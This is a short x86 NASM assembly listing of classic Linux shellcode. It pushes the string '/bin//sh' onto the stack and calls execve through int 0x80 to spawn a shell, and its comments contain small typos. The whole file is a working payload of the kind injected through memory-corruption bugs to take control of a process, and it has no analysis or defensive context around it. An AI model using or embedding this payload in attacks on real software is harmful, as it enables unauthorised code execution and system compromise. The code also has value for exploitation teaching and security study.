BITS 32

xor eax,eax
;excev -> #11,filename,argv,envp
push eax
push 0x68732f2f ;;
push 0x6e69622f ;; /bin//shl
mov ebx,esp
push eax
mov edx,esp
push ebx
mov ecx,esp
mov al,11
int 0x80